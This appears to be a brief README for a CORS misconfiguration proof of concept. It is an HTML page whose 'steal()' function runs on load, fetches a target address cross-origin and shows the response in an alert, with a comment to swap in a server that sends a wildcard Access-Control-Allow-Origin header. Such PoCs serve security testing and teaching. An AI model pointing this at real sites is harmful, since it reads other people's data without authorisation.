# CORS-POC

<pre>
<html>
    <head>
    <script>
        function steal() {
            var r = new XMLHttpRequest();
            r.onreadystatechange = function() {
                if (r.readyState == 4 && r.status == 200) {
                    alert(r.responseText);
                }
            };
            #Chanage server IP below look for Access-Control-Allow-Origin: *
            r.open("GET", "http://192.168.78.135", true);
            r.send();
        }
    </script>
    </head>
    <body onload="steal()">
    </body>
</html>
</pre>
